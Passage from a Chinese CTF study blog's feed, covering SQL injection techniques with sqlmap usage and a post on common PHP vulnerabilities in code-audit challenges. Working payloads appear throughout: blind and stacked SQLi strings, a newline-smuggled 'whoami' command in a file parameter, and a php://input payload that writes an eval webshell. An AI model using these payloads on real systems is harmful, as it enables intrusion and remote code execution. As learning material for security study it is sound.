1(也就是没有延时)，由此来推出数据库长度。</p></li><li><p>判断当前数据库名的第一个和第二个字母的语句：</p><pre class="line-numbers language-none"><code class="language-none">if(substr(database(),1,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if(substr(database(),2,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。</p></li><li><p>根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。</p></li></ol><h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><ol><li><p>可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；</p></li><li><p>同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；</p></li><li><p>堆叠注入的语句为</p><pre class="line-numbers language-none"><code class="language-none">;select if(length(database())&gt;1,sleep(3),1);select if(substr(database(),1,1)='r',sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。</p></li></ol><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><ol><li>二次注入一共有两个url，一个url用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；</li><li>也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；</li><li>就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；</li><li>跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；</li><li>后面就是union注入攻击的常规操作。</li></ol><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><ol><li>如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；</li><li>一般情况下，此处就不存在sql注入漏洞的；</li><li>但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；</li><li>宽字节的格式是在地址后先加一个 %df ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；</li><li>因此构造闭合规则时，在单引号前面加上 %df 就行了；</li><li>之后在闭合规则中写入同union注入的一些查询语句就行了；</li></ol><h4 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h4><p>首先base64是什么?</p><p>Base64是网络上最常见的用于传输8Bit<a href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683">字节码</a>的编码方式之一，Base64就是一种基于64个可打印字符来表示<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457">二进制</a>数据的方法。Base64编码是从二进制到字符的过程，可用于在<a href="https://baike.baidu.com/item/HTTP">HTTP</a>环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。</p><ol><li>如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；</li><li>那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；</li><li>注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。</li></ol><h4 id="http请求头—cooki注入"><a href="#http请求头—cooki注入" class="headerlink" title="http请求头—cooki注入"></a>http请求头—cooki注入</h4><ol><li><p>抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；</p></li><li><p>常见的http头部注入的参数有：</p><pre class="line-numbers language-none"><code class="language-none">【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；</p></li><li><p>和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</p></li></ol><h4 id="http请求头—XFF注入"><a href="#http请求头—XFF注入" class="headerlink" title="http请求头—XFF注入"></a>http请求头—XFF注入</h4><ol><li>XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；</li><li>例如测试此参数的值 X-Forwarded-for:127.0.0.1’ 响应有sql报错，那么此处就是注入点；</li><li>之后使用union注入的方法完成即可。</li></ol><h4 id="知道绝对路径的注入"><a href="#知道绝对路径的注入" class="headerlink" title="知道绝对路径的注入"></a>知道绝对路径的注入</h4><ol><li>如果知道了网站的根目录，并且知道此站点存在sql注入；</li><li>猜测此数据库可能有file权限，那么我们就可以使用语句：into outfile 来写shell到网站的根目录下，之后用蚁剑连接；</li><li>如果数据库没有file权限，就用sqlmap的参数 –is-dba 来查看当前数据库的用户是否有管理员权限；</li><li>如果有管理员权限，我们就可以使用sqlmap里面的参数命令 –os-shell 来上传、反弹shell，最终getshell；</li><li>如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。</li></ol><h3 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h3><p>sqlmap支持一下五种注入：</p><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li><li>联合查询注入，可以使用union的情况下的注入。</li><li>堆查询注入，可以同时执行多条语句的执行时的注入。</li></ol><p>下面有简要的操作概述</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201128195139347.png" alt="image-20201128195139347"></p><p>命令太多了，还不太熟练，目前只会用一点</p><p>一些基本命令</p><h4 id="1-输出等级-V"><a href="#1-输出等级-V" class="headerlink" title="1.输出等级 V"></a>1.输出等级 V</h4><p><code>V</code> 这个命令，在 SQLMap 里可以理解成是一共输出的信息，他的测试等级是非常多的，一共分了七个等级出来，这七个等级在测试的时候会在界面里返回不同的内容。</p><p>默认是 1，也可以在命令后指定 <code>-v 3</code> 就是等级 3 的输出。</p><pre class="line-numbers language-none"><code class="language-none">0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；1：同时显示普通信息 [INFO] 和警告信息 [WARNING]；2：同时显示调试信息 [DEBUG]；3：同时显示注入使用的攻击荷载；4：同时显示 HTTP 请求；5：同时显示 HTTP 响应头；6：同时显示 HTTP 响应体。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-指定目标-U"><a href="#2-指定目标-U" class="headerlink" title="2.指定目标 U"></a>2.指定目标 <code>U</code></h4><p>使用参数 <code>-u</code> 或 <code>–url</code> 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "www.baidu.com/user.php?id=7"sqlmap.py -url "www.baidu.com:8080/user.php?id=7"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-列库-dbs"><a href="#3-列库-dbs" class="headerlink" title="3. 列库 dbs"></a>3. 列库 <code>dbs</code></h4><p>在检测出了存在注入后，就要进行对数据库的列举，命令是 <code>--dbs</code></p><h4 id="4-列表-tables"><a href="#4-列表-tables" class="headerlink" title="4. 列表 tables"></a>4. 列表 <code>tables</code></h4><p>在列出了 Web 程序的库后，要根据这个库来列出表，命令是 <code>-D ‘库名’ --tables</code></p><h4 id="5-列出表中字段-columns"><a href="#5-列出表中字段-columns" class="headerlink" title="5. 列出表中字段 columns"></a>5. 列出表中字段 <code>columns</code></h4><p>得到了库和表之后，可以根据这个库表来列出表里的字段进行数据的读取，命令是 <code>-D ‘库名’ -T ‘表名’ --columns</code></p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201128202955153.png" alt="image-20201128202955153"></p><p>这些只是一些枚举常用的，更多用法慢慢解锁吧</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉对于一些注入了解的还是不够深，有时候碰到新题自己试了各种方法总是要很久才做的出来。</p><p>也可能是我数据库学的不怎么样，如果对数据库越熟悉的话做题起来应该会如鱼得水。</p><p>自己目前也只是学了一个mysql，打算有空看看其他的数据库。</p><p>其次sqlmap也还是用的不熟练，还是需要多去刷题多练练啊。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php常见漏洞</title>
      <link href="2020/11/26/php-chang-jian-lou-dong/"/>
      <url>2020/11/26/php-chang-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="ctf中常见的php漏洞"><a href="#ctf中常见的php漏洞" class="headerlink" title="ctf中常见的php漏洞"></a>ctf中常见的php漏洞</h2><p>刷题的时候遇到一些php代码审计的题目，其中也都一些是自己没遇到过，从网络上搜集的。</p><h3 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h3><pre class="line-numbers language-none"><code class="language-none">$_POST // 获取 post 数据，是一个字典$_GET // 获取 get 数据，是一个字典$_COOKIE // 获取 cookie$_SESSION // 获取 session$_FILE // 获取上传的文件$_REQUEST // 获取 $_GET，$_POST，$_COOKIE 中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h3><p>PHP 支持一个错误控制运算符：@。当将其放置在一个PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p><h3 id="弱类型漏洞"><a href="#弱类型漏洞" class="headerlink" title="弱类型漏洞"></a>弱类型漏洞</h3><p>PHP是弱类型语言，不须要明确的定义变量的类型，变量的类型根据使用时的上下文所决定，也就是变量会根据不一样表达式所须要的类型自动转换，好比求和，PHP会将两个相加的值转为long、double再进行加和。每种类型转为另一种类型都有固定的规则，当某个操做发现类型不符时就会按照这个规则进行转换，这个规则正是弱类型实现的基础。</p><h4 id="和-的区别"><a href="#和-的区别" class="headerlink" title="==和===的区别"></a>==和===的区别</h4><pre class="line-numbers language-none"><code class="language-none">==  会在比较的时候装化成相同的类型=== 先判断左右两者类型是否相等之后再作比较（这个更严格一些）整数和字符串进行比较的时候，字符串数字后的内容会被省略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h4><p>当数组(array)与任何非数组进行比较时，数组老是最大的</p><h4 id="bool类型比较"><a href="#bool类型比较" class="headerlink" title="bool类型比较"></a>bool类型比较</h4><p>bool类型的true跟任意字符能够弱类型相等</p><h4 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h4><p>1.md5()绕过<code>==</code></p><p> PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//bool(true)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//bool(false)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面两个值可以使md5()的开头为0e，经过<code>==</code>弱类型比较可输出‘yes’，但没法经过<code>===</code></p><p>经常使用md5()开头为“0e”的字符：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token comment">//0e830400451993494058024219903391</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'240610708'</span><span class="token punctuation">)</span><span class="token comment">//0e462097431906509019562988736854</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span><span class="token comment">//0e545993274517709034328855841020</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s155964671a'</span><span class="token punctuation">)</span><span class="token comment">//0e342768416822451524974117254469</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s214587387a'</span><span class="token punctuation">)</span><span class="token comment">//0e848240448830537924465865611904</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span><span class="token comment">//0e545993274517709034328855841020</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1091221200a'</span><span class="token punctuation">)</span><span class="token comment">//0e940624217856561557816327384675</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1885207154a'</span><span class="token punctuation">)</span><span class="token comment">//0e509367213418206700842008763514</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.md5([])绕过<code>===</code></p><p>因为md5()函数不能处理数组，因此在md5()遇到数组时会警告而且返回null，然而能够忽略警告并经过数组绕过<code>===</code>，以下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//bool(true)</span><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//bool(true)，@表示忽略警告</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bool(true)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ffifdyop</code>，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p><p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p><h4 id="sha1-函数"><a href="#sha1-函数" class="headerlink" title="sha1()函数"></a>sha1()函数</h4><p>sha1()与md5()基本原理相同，因此此处仅列出sha1()开头为“0e”的字符串。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaroZmOk'</span><span class="token punctuation">)</span><span class="token comment">//0e66507019969427134894567494305185566735</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaK1STfY'</span><span class="token punctuation">)</span><span class="token comment">//0e76658526655756207688271159624026011393</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaO8zKZF'</span><span class="token punctuation">)</span><span class="token comment">//0e89257456677279068558073954252716165668</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa3OFF9m'</span><span class="token punctuation">)</span><span class="token comment">//0e36977786278517984959260394024281014729</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="strcmp-、strcasecmp-函数"><a href="#strcmp-、strcasecmp-函数" class="headerlink" title="strcmp()、strcasecmp()`函数"></a>strcmp()、strcasecmp()`函数</h4><ul><li><p><code>strcmp(string1, string2)</code>、<code>strcasecmp(string1, string2)</code></p><p>比较两个字符串，前者不区分大小写，后者区分大小写。若<code>string1 &gt; string2</code>，返回<code>&gt; 0</code>；若<code>string1 &lt; string2</code>，返回<code>&lt; 0</code>;若<code>string1 = string2</code>，返回<code>0</code>。然而该函数没法处理数组，当出现数组时，返回<code>null</code>。(下例中@表示忽略警告)</p><pre class="line-numbers language-none"><code class="language-none">var_dump(@strcmp([],1));//NULLvar_dump(@strcmp([],'flag') == 0);//bool(true)var_dump(@strcmp([],'flag') === 0);//bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h4></li></ul><p><code>intval()</code> 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，<code>intval()</code> 不会报错而是返回 0。</p><pre class="line-numbers language-none"><code class="language-none">var_dump(intval('2')) // 2var_dump(intval('3abcd')) // 3var_dump(intval('abcd')) // 0var_dump(0 == '0'); // truevar_dump(0 == 'abcdefg'); // true var_dump(0 === 'abcdefg'); // falsevar_dump(1 == '1abcdef'); // trueif(intval($a) &gt; 1000) {    mysql_query("select * from news where id=".$a)}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p>trim 函数会过滤空格以及 \n\r\t\v\0，但不会过滤过滤\f</p><pre class="line-numbers language-none"><code class="language-none">$a = "  \n\r\t\v\0abc  \f";var_dump(trim($a)); // abc  \f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>可以在这个网站学习学习正则[regex]:(<a href="https://regexr.com/">https://regexr.com/</a>)</p><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h4><p>preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(<code>^</code> 和 <code>$</code>)，则可以存在绕过的问题</p><pre class="line-numbers language-none"><code class="language-none">$ip = '1.1.1.1 abcd'; // 可以绕过if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {  die('error');} else {  // echo('key...')}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时，后面的 php 语句就不会执行。payload:</p><pre class="line-numbers language-none"><code class="language-none">$code="xdsec###AAAAAAAAAAAAAAAAAAA(超多个A)";preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/", $code));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就是匹配文件名由字母、数字、下划线、破则号、斜杠、空白字符各种组合的并且后缀名是rpt的文件，如果匹配成功，就执行系统命令file打印文件的类型和编码信息，如果匹配失败就打印’regex failed’.</p><p>[<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami%5D">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami]</a>(<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p><p>如果开启了/m，会存在绕过</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$file_name=$_GET['path'];if (!preg_match("/^[a-zA-Z0-9-s_]+.rpt$/m", $file_name)) {  echo "regex failed";} else {    echo exec("/usr/bin/file -i -b ".$file_name);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到正则表达式结尾的/m 了，在php中，/m表示开启多行匹配模式，开启多行匹配模式之后<code>^</code>和<code>$</code>的含义就发生了变化，没开启多行模式之前(即单行匹配模式), <code>^</code> 和<code>$</code> 是匹配字符串的开始和结尾，开启多行模式之后，多行模式<code>^</code>,<code>$</code>可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，所以进入了exec执行分支，进而导致命令执行。</p><p>[<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami%5D">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami]</a>(<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p><p>开启/m</p><pre class="line-numbers language-none"><code class="language-none">^ 行首$ 行尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不开启/m</p><pre class="line-numbers language-none"><code class="language-none">^ 字符串的开始$ 字符串的结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修饰符说明</p><pre class="line-numbers language-none"><code class="language-none">i 在和正则匹配是不区分大小写 m 将字符串视为多行。默认的正则开始“^”和结束“$”将目标字条串作为一单一的一“行”字符（甚至其中包括换行符也是如此）。如果在修饰符中加上“m”，那么开始和结束将会指点字符串的每一行的开头就是“^”结束就是“$”。 o 评估表达式只有一次s 如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。 x 忽略空白，除非进行转义的不被忽略。 g 在全局范围内找到所有匹配cg 即使全局匹配失败也允许搜索继续<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h4><p>正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE</p><h4 id="ereg-00-截断"><a href="#ereg-00-截断" class="headerlink" title="ereg %00 截断"></a>ereg %00 截断</h4><p>ereg 读到 %00 的时候，就截止了</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php    if (ereg ("^[a-zA-Z]+$", $_GET['a']) === FALSE)  {        echo 'You password must be alphabet';    }?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里 <code>a=abcd%001234</code>，可以绕过</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php      $auth = '0';      // 这里可以覆盖$auth的变量值    extract($_GET);     if($auth == 1){          echo "private!";      } else{          echo "public!";      }  ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h4><p>parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p><pre class="line-numbers language-none"><code class="language-none">//var.php?var=new  $var='init';  parse_str($_SERVER['QUERY_STRING']);// $var 会变成 newecho $var;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$ 变量覆盖"></a>$$ 变量覆盖</h4><p>如果把变量本身的 key 也当变量，也就是使用了 <code>$$</code>，就可能存在问题。</p><pre class="line-numbers language-none"><code class="language-none">$_ = '_POST';// $$_ 是等于 $_POST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例子</p><pre class="line-numbers language-none"><code class="language-none">// http://127.0.0.1/index.php?_CONFIG=123$_CONFIG['extraSecure'] = true; foreach(array('_GET','_POST') as $method) {    foreach($$method as $key=&gt;$value) {      // $key == _CONFIG      // $$key == $_CONFIG      // 这个函数会把 $_CONFIG 变量销毁      unset($$key);    }} if ($_CONFIG['extraSecure'] == false) {    echo 'flag {****}';}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组类型数据的覆盖</p><pre class="line-numbers language-none"><code class="language-none">// index.php?_SESSION[userinfo][id]=1&amp;_SESSION[userinfo][username]=adminforeach (array('_COOKIE','_POST','_GET') as $_request)  {    foreach ($$_request as $_key=&gt;$_value)      {        $$_key=  $_value;    }}echo $_SESSION["userinfo"]["id"];echo '&lt;br&gt;';echo $_SESSION["userinfo"]["username"];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是如果后面有 <code>session_start()</code> 会重新初始化上面的 <code>$_SESSION</code> 数据，因此又被还原回去。</p><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这四个函数会将包含的文件作为php文件解析</p><p>_once表示同名文件只引入一次，include在引入不存文件时产生一个警告且脚本还会继续执行，require则会导致一个致命性错误且脚本停止执行。<br>include()是有条件包含函数，而 require()则是无条件包含函数<br>include有返回值，而require没有<br>理论上来说：include和require后面加不加括号对执行结果没有区别，但是加上括号效率较低，所以后面能不加括号就不加括号。</p><p>可利用的文件包含漏洞条件：<br>1.include()等函数通过动态变量方式引入需要包含的文件<br>2.用户可控制该动态变量</p><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>涉及的相关协议：<code>file://</code>、<code>php://filter</code>、<code>php://input</code>、<code>zip://</code>、<code>compress.bzip2://</code>、<code>compress.zlib://</code>、<code>data://</code></p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><ul><li><p>简介<br><code>php://</code>:是个能够访问请求的原始数据的只读流。POST请求的状况下，最好用<code>php://input</code>来代替<code>$HTTP_RAW_POST_DATA</code>，由于他不依赖于特定的<code>php.ini</code>指令，并且，这样的状况下<code>$HTTP_RAW_POST_DATA</code>默认没有填充，比激活<code>always_populate_raw_post_data</code>潜在须要更少的内存，<code>enctype="multipart/form-data"</code>的时候<code>php://input</code>是无效的。</p><p>简单理解：除<code>enctype="multipart/form-data"</code>外，获取POST数据（可做为php代码执行）。</p></li><li><p>使用条件</p></li><li><p>范例</p><p>环境：</p><pre class="line-numbers language-none"><code class="language-none">//input.php&lt;?phpinclude($_GET[file]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>应用：</p><pre class="line-numbers language-none"><code class="language-none">//payload[GET DATA]:   input.php?file=php://input[POST DATA 1]:&lt;?php phpinfo();?&gt;[POST DATA 2]:&lt;?php system('ls');?&gt;[POST DATA 3]:&lt;?php fputs(fopen("shell.php","w"),'&lt;?php @eval($_POST[cmd]);?&gt;');?&gt;#我没写入成功，缘由待查。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:filter"></a>php:filter</h4></li><li><p>介绍<br><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数很是有用，相似 <code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>， 在数据流内容读取以前没有机会应用其余过滤器。</p><p><code>php://filter</code>目标使用如下的参数做为它路径的一部分。 复合过滤链可以在一个路径上指定。详细使用这些参数能够参考具体范例。<br><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/25be41facc7e4715934626bc731c9dd2-1.jpg" 